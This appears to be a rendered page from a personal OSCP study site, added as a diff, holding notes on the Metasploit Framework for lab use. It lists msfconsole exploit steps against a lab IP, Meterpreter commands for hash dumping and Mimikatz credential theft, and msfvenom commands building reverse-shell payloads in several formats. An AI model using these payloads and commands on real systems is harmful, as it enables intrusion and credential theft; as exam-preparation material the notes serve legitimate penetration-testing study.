@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Notes — Metasploit Framework — Shruthi Poojari | OSCP Notes</title>
+  <link rel="stylesheet" href="/oscp_learning/static/style.css">
+  <style>pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.codehilite .hll { background-color: #49483e }
+.codehilite { background: #272822; color: #F8F8F2 }
+.codehilite .c { color: #959077 } /* Comment */
+.codehilite .err { color: #ED007E; background-color: #1E0010 } /* Error */
+.codehilite .esc { color: #F8F8F2 } /* Escape */
+.codehilite .g { color: #F8F8F2 } /* Generic */
+.codehilite .k { color: #66D9EF } /* Keyword */
+.codehilite .l { color: #AE81FF } /* Literal */
+.codehilite .n { color: #F8F8F2 } /* Name */
+.codehilite .o { color: #FF4689 } /* Operator */
+.codehilite .x { color: #F8F8F2 } /* Other */
+.codehilite .p { color: #F8F8F2 } /* Punctuation */
+.codehilite .ch { color: #959077 } /* Comment.Hashbang */
+.codehilite .cm { color: #959077 } /* Comment.Multiline */
+.codehilite .cp { color: #959077 } /* Comment.Preproc */
+.codehilite .cpf { color: #959077 } /* Comment.PreprocFile */
+.codehilite .c1 { color: #959077 } /* Comment.Single */
+.codehilite .cs { color: #959077 } /* Comment.Special */
+.codehilite .gd { color: #FF4689 } /* Generic.Deleted */
+.codehilite .ge { color: #F8F8F2; font-style: italic } /* Generic.Emph */
+.codehilite .ges { color: #F8F8F2; font-weight: bold; font-style: italic } /* Generic.EmphStrong */
+.codehilite .gr { color: #FF4689 } /* Generic.Error */
+.codehilite .gh { color: #F8F8F2 } /* Generic.Heading */
+.codehilite .gi { color: #A6E22E } /* Generic.Inserted */
+.codehilite .go { color: #66D9EF } /* Generic.Output */
+.codehilite .gp { color: #FF4689; font-weight: bold } /* Generic.Prompt */
+.codehilite .gs { color: #F8F8F2; font-weight: bold } /* Generic.Strong */
+.codehilite .gu { color: #959077 } /* Generic.Subheading */
+.codehilite .gt { color: #66D9EF } /* Generic.Traceback */
+.codehilite .kc { color: #66D9EF } /* Keyword.Constant */
+.codehilite .kd { color: #66D9EF } /* Keyword.Declaration */
+.codehilite .kn { color: #FF4689 } /* Keyword.Namespace */
+.codehilite .kp { color: #66D9EF } /* Keyword.Pseudo */
+.codehilite .kr { color: #66D9EF } /* Keyword.Reserved */
+.codehilite .kt { color: #66D9EF } /* Keyword.Type */
+.codehilite .ld { color: #E6DB74 } /* Literal.Date */
+.codehilite .m { color: #AE81FF } /* Literal.Number */
+.codehilite .s { color: #E6DB74 } /* Literal.String */
+.codehilite .na { color: #A6E22E } /* Name.Attribute */
+.codehilite .nb { color: #A6E22E } /* Name.Builtin */
+.codehilite .nc { color: #A6E22E } /* Name.Class */
+.codehilite .no { color: #66D9EF } /* Name.Constant */
+.codehilite .nd { color: #A6E22E } /* Name.Decorator */
+.codehilite .ni { color: #F8F8F2 } /* Name.Entity */
+.codehilite .ne { color: #A6E22E } /* Name.Exception */
+.codehilite .nf { color: #A6E22E } /* Name.Function */
+.codehilite .nl { color: #F8F8F2 } /* Name.Label */
+.codehilite .nn { color: #F8F8F2 } /* Name.Namespace */
+.codehilite .nx { color: #A6E22E } /* Name.Other */
+.codehilite .py { color: #F8F8F2 } /* Name.Property */
+.codehilite .nt { color: #FF4689 } /* Name.Tag */
+.codehilite .nv { color: #F8F8F2 } /* Name.Variable */
+.codehilite .ow { color: #FF4689 } /* Operator.Word */
+.codehilite .pm { color: #F8F8F2 } /* Punctuation.Marker */
+.codehilite .w { color: #F8F8F2 } /* Text.Whitespace */
+.codehilite .mb { color: #AE81FF } /* Literal.Number.Bin */
+.codehilite .mf { color: #AE81FF } /* Literal.Number.Float */
+.codehilite .mh { color: #AE81FF } /* Literal.Number.Hex */
+.codehilite .mi { color: #AE81FF } /* Literal.Number.Integer */
+.codehilite .mo { color: #AE81FF } /* Literal.Number.Oct */
+.codehilite .sa { color: #E6DB74 } /* Literal.String.Affix */
+.codehilite .sb { color: #E6DB74 } /* Literal.String.Backtick */
+.codehilite .sc { color: #E6DB74 } /* Literal.String.Char */
+.codehilite .dl { color: #E6DB74 } /* Literal.String.Delimiter */
+.codehilite .sd { color: #E6DB74 } /* Literal.String.Doc */
+.codehilite .s2 { color: #E6DB74 } /* Literal.String.Double */
+.codehilite .se { color: #AE81FF } /* Literal.String.Escape */
+.codehilite .sh { color: #E6DB74 } /* Literal.String.Heredoc */
+.codehilite .si { color: #E6DB74 } /* Literal.String.Interpol */
+.codehilite .sx { color: #E6DB74 } /* Literal.String.Other */
+.codehilite .sr { color: #E6DB74 } /* Literal.String.Regex */
+.codehilite .s1 { color: #E6DB74 } /* Literal.String.Single */
+.codehilite .ss { color: #E6DB74 } /* Literal.String.Symbol */
+.codehilite .bp { color: #A6E22E } /* Name.Builtin.Pseudo */
+.codehilite .fm { color: #A6E22E } /* Name.Function.Magic */
+.codehilite .vc { color: #F8F8F2 } /* Name.Variable.Class */
+.codehilite .vg { color: #F8F8F2 } /* Name.Variable.Global */
+.codehilite .vi { color: #F8F8F2 } /* Name.Variable.Instance */
+.codehilite .vm { color: #F8F8F2 } /* Name.Variable.Magic */
+.codehilite .il { color: #AE81FF } /* Literal.Number.Integer.Long */</style>
+  <script>
+    // Set theme before paint to avoid a flash of the wrong theme.
+    (function () {
+      var saved = localStorage.getItem('theme');
+      var theme = saved || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
+      document.documentElement.setAttribute('data-theme', theme);
+    })();
+  </script>
+</head>
+<body>
+  <aside class="sidebar">
+    <a class="brand" href="/oscp_learning/index.html">Shruthi&nbsp;Poojari<span class="brand-sub">OSCP Notes &amp; Machines</span></a>
+    <input id="filter" type="search" placeholder="Filter notes…" autocomplete="off">
+    <nav>
+      
+      <div class="group">
+        <h3>General</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/OSCP-Methodology.md.html">OSCP Methodology — Master Guide</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/README.md.html">OSCP Prep Repository</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>Notes</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/DNS.md.html">Notes — DNS (53)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/FTP.md.html">Notes — FTP (21)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/File-Transfer.md.html">Notes — File Transfer</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/HTTP.md.html">Notes — HTTP / HTTPS (80 / 443 / 8080 / 8443)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/LDAP.md.html">Notes — LDAP (389 / 636)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/MSSQL.md.html">Notes — MSSQL (1433)</a>
+          </li>
+          
+          <li>
+            <a class="active"
+               href="/oscp_learning/Notes/Metasploit.md.html">Notes — Metasploit Framework</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/Nmap.md.html">Notes — Nmap</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/PrivEsc.md.html">Notes — Privilege Escalation</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/Reverse-Shells.md.html">Notes — Reverse Shells & Shell Upgrades</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/SMB.md.html">Notes — SMB (139 / 445)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/WinRM.md.html">Notes — WinRM (5985 / 5986)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/References.md.html">OSCP — References & Resources</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>HTB Machines</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/Enigma.md.html">HTB — Enigma</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/Lame.md.html">HTB — Lame</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/Legacy.md.html">HTB — Legacy</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>Samples</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/samples/Lame-7h3rAm-writeup.md.html">Lame-7h3rAm-writeup</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/samples/Legacy-7h3rAm-writeup.md.html">Legacy-7h3rAm-writeup</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+    </nav>
+  </aside>
+
+  <main>
+    <header class="topbar">
+      <a class="topbar-brand" href="/oscp_learning/index.html">
+        <span class="dot"></span> OSCP Notes <b>&amp; Machines</b>
+      </a>
+      <nav class="topbar-links">
+        <a href="/oscp_learning/OSCP-Methodology.md.html">Methodology</a>
+        <a href="/oscp_learning/Notes/Nmap.md.html">Notes</a>
+        <a href="/oscp_learning/HTB/Lame.md.html">Machines</a>
+        
+        <a href="https://github.com/Shruthi-Poojari/oscp_learning" target="_blank" rel="noopener" class="icon-link" title="GitHub repository">GitHub <span class="ext">↗</span></a>
+        
+        <button id="theme-toggle" type="button" title="Toggle light/dark" aria-label="Toggle theme">
+          <span class="icon-dark">🌙</span><span class="icon-light">☀️</span>
+        </button>
+      </nav>
+    </header>
+    <div class="crumbs-strip">
+      <span class="crumb-group">Notes</span>
+      <span class="crumb-sep">›</span>
+      <span class="crumb-page">Notes — Metasploit Framework</span>
+    </div>
+    <article class="markdown-body">
+      <h1 id="notes-metasploit-framework">Notes — Metasploit Framework</h1>
+<blockquote>
+<p>Authorized lab/OSCP use only.
+<strong>OSCP rule:</strong> Metasploit (and the Meterpreter payload) may be used on <strong>only one</strong> exam machine, and <code>msfvenom</code>/<code>multi-handler</code> restrictions apply. Learn the manual equivalents — this note covers both the framework and the standalone <code>msfvenom</code> payloads you're allowed to use freely.</p>
+</blockquote>
+<hr />
+<h2 id="setup">Setup</h2>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>msfdb<span class="w"> </span>init<span class="w">          </span><span class="c1"># initialize the database</span>
+msfconsole<span class="w">              </span><span class="c1"># start the console</span>
+db_status<span class="w">               </span><span class="c1"># confirm DB connection</span>
+workspace<span class="w"> </span>-a<span class="w"> </span>lame<span class="w">       </span><span class="c1"># per-target workspace</span>
+</code></pre></div>
+
+<h2 id="core-console-workflow">Core Console Workflow</h2>
+<div class="codehilite"><pre><span></span><code>search<span class="w"> </span>ms17-010<span class="w">                 </span><span class="c1"># find modules by CVE/keyword</span>
+search<span class="w"> </span>type:exploit<span class="w"> </span>platform:windows<span class="w"> </span>smb
+use<span class="w"> </span>exploit/windows/smb/ms17_010_psexec
+info<span class="w">                            </span><span class="c1"># module details</span>
+show<span class="w"> </span>options<span class="w">                    </span><span class="c1"># required settings (RHOSTS, LHOST, etc.)</span>
+<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">10</span>.10.10.4
+<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span>tun0<span class="w">                  </span><span class="c1"># can use interface name</span>
+<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+show<span class="w"> </span>payloads<span class="w">                   </span><span class="c1"># compatible payloads</span>
+<span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/x64/meterpreter/reverse_tcp
+check<span class="w">                           </span><span class="c1"># safe vuln check (where supported)</span>
+exploit<span class="w">                         </span><span class="c1"># or: run</span>
+exploit<span class="w"> </span>-j<span class="w">                      </span><span class="c1"># run as background job</span>
+</code></pre></div>
+
+<h2 id="sessions">Sessions</h2>
+<div class="codehilite"><pre><span></span><code>sessions<span class="w">                        </span><span class="c1"># list sessions</span>
+sessions<span class="w"> </span>-i<span class="w"> </span><span class="m">1</span><span class="w">                   </span><span class="c1"># interact with session 1</span>
+background<span class="w">                      </span><span class="c1"># (Ctrl+Z) drop session to background</span>
+sessions<span class="w"> </span>-u<span class="w"> </span><span class="m">1</span><span class="w">                   </span><span class="c1"># upgrade shell to meterpreter</span>
+sessions<span class="w"> </span>-k<span class="w"> </span><span class="m">1</span><span class="w">                   </span><span class="c1"># kill session 1</span>
+</code></pre></div>
+
+<h2 id="multihandler-catch-a-shell-from-a-standalone-payload">Multi/Handler (catch a shell from a standalone payload)</h2>
+<div class="codehilite"><pre><span></span><code>use<span class="w"> </span>exploit/multi/handler
+<span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/x64/meterpreter/reverse_tcp
+<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span>tun0
+<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+exploit<span class="w"> </span>-j
+</code></pre></div>
+
+<h2 id="meterpreter-cheatsheet">Meterpreter Cheatsheet</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>getuid</code></td>
+<td>Current user context</td>
+</tr>
+<tr>
+<td><code>sysinfo</code></td>
+<td>OS/arch info</td>
+</tr>
+<tr>
+<td><code>getprivs</code></td>
+<td>Enabled privileges</td>
+</tr>
+<tr>
+<td><code>ps</code> / <code>migrate &lt;pid&gt;</code></td>
+<td>List / migrate to a process</td>
+</tr>
+<tr>
+<td><code>shell</code></td>
+<td>Drop to a system shell</td>
+</tr>
+<tr>
+<td><code>upload &lt;l&gt; &lt;r&gt;</code> / <code>download &lt;r&gt; &lt;l&gt;</code></td>
+<td>File transfer</td>
+</tr>
+<tr>
+<td><code>hashdump</code></td>
+<td>Dump local SAM hashes</td>
+</tr>
+<tr>
+<td><code>getsystem</code></td>
+<td>Attempt local privesc to SYSTEM</td>
+</tr>
+<tr>
+<td><code>load kiwi</code> → <code>creds_all</code></td>
+<td>Mimikatz in-memory</td>
+</tr>
+<tr>
+<td><code>portfwd add -l 3389 -p 3389 -r &lt;ip&gt;</code></td>
+<td>Port forwarding</td>
+</tr>
+<tr>
+<td><code>run post/multi/recon/local_exploit_suggester</code></td>
+<td>Suggest privesc modules</td>
+</tr>
+<tr>
+<td><code>background</code> / <code>sessions</code></td>
+<td>Session management</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="msfvenom-payload-generation-allowed-on-oscp">msfvenom (payload generation — allowed on OSCP)</h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># list payloads / formats / encoders</span>
+msfvenom<span class="w"> </span>-l<span class="w"> </span>payloads
+msfvenom<span class="w"> </span>--list<span class="w"> </span>formats
+
+<span class="c1"># Windows reverse shell (non-meterpreter — exam-safe)</span>
+msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>tun0<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>shell.exe
+
+<span class="c1"># Linux reverse shell</span>
+msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>tun0<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>shell.elf
+
+<span class="c1"># Meterpreter (counts toward the one-box MSF limit)</span>
+msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>tun0<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>met.exe
+
+<span class="c1"># Web payloads</span>
+msfvenom<span class="w"> </span>-p<span class="w"> </span>php/reverse_php<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>tun0<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>raw<span class="w"> </span>-o<span class="w"> </span>shell.php
+msfvenom<span class="w"> </span>-p<span class="w"> </span>java/jsp_shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>tun0<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>raw<span class="w"> </span>-o<span class="w"> </span>shell.jsp
+msfvenom<span class="w"> </span>-p<span class="w"> </span>java/jsp_shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>tun0<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>war<span class="w"> </span>-o<span class="w"> </span>shell.war<span class="w">   </span><span class="c1"># Tomcat</span>
+msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>tun0<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>asp<span class="w"> </span>-o<span class="w"> </span>shell.asp
+
+<span class="c1"># Shellcode for buffer-overflow exploits (-b = bad chars)</span>
+msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>tun0<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>c<span class="w"> </span>-b<span class="w"> </span><span class="s2">"\x00\x0a\x0d"</span><span class="w"> </span><span class="nv">EXITFUNC</span><span class="o">=</span>thread
+</code></pre></div>
+
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-p</code></td>
+<td>Payload</td>
+</tr>
+<tr>
+<td><code>-f</code></td>
+<td>Output format (exe, elf, raw, c, war, asp, psh)</td>
+</tr>
+<tr>
+<td><code>-o</code></td>
+<td>Output file</td>
+</tr>
+<tr>
+<td><code>-b</code></td>
+<td>Bad characters to avoid</td>
+</tr>
+<tr>
+<td><code>-e</code></td>
+<td>Encoder (e.g. <code>x86/shikata_ga_nai</code>)</td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td>Encoding iterations</td>
+</tr>
+<tr>
+<td><code>LHOST/LPORT</code></td>
+<td>Callback address/port</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="useful-auxiliary-post-modules">Useful Auxiliary / Post Modules</h2>
+<div class="codehilite"><pre><span></span><code>auxiliary/scanner/smb/smb_version
+auxiliary/scanner/smb/smb_ms17_010
+auxiliary/scanner/ssh/ssh_login
+post/multi/recon/local_exploit_suggester
+post/windows/gather/hashdump
+</code></pre></div>
+
+<h2 id="searchsploit-metasploit">searchsploit ↔ Metasploit</h2>
+<div class="codehilite"><pre><span></span><code>searchsploit<span class="w"> </span>ms08-067<span class="w">           </span><span class="c1"># confirm public exploit exists</span>
+searchsploit<span class="w"> </span>-m<span class="w"> </span>&lt;path&gt;<span class="w">          </span><span class="c1"># copy exploit locally (manual route)</span>
+</code></pre></div>
+
+<hr />
+<h2 id="common-mistakes">Common Mistakes</h2>
+<ul>
+<li>Forgetting to set <code>LHOST</code> to the VPN interface (<code>tun0</code>), so the shell never calls back.</li>
+<li>Using Meterpreter on more than one exam box (disqualifying).</li>
+<li><code>exploit</code> with no listener/handler for a staged payload mismatch (stage vs stageless).</li>
+<li>Wrong architecture payload (<code>x86</code> vs <code>x64</code>).</li>
+</ul>
+<h2 id="oscp-tips">OSCP Tips</h2>
+<ul>
+<li>Budget your single MSF/Meterpreter box deliberately — don't waste it early.</li>
+<li><code>msfvenom</code> payloads + <code>nc</code>/<code>multi-handler</code> are fine everywhere; master them.</li>
+<li><code>local_exploit_suggester</code> is a great hint generator — then verify/exploit manually.</li>
+<li>Always prefer a non-staged, non-meterpreter payload (<code>shell_reverse_tcp</code>) when you want to stay within exam limits.</li>
+</ul>
+    </article>
+  </main>
+
+  <script>
+    const toggle = document.getElementById('theme-toggle');
+    toggle.addEventListener('click', () => {
+      const next = document.documentElement.getAttribute('data-theme') === 'light' ? 'dark' : 'light';
+      document.documentElement.setAttribute('data-theme', next);
+      localStorage.setItem('theme', next);
+    });
+
+    const filter = document.getElementById('filter');
+    filter.addEventListener('input', () => {
+      const q = filter.value.toLowerCase();
+      document.querySelectorAll('.sidebar li').forEach(li => {
+        li.style.display = li.textContent.toLowerCase().includes(q) ? '' : 'none';
+      });
+      document.querySelectorAll('.group').forEach(g => {
+        const any = [...g.querySelectorAll('li')].some(li => li.style.display !== 'none');
+        g.style.display = any ? '' : 'none';
+      });
+    });
+  </script>
+</body>
+</html>
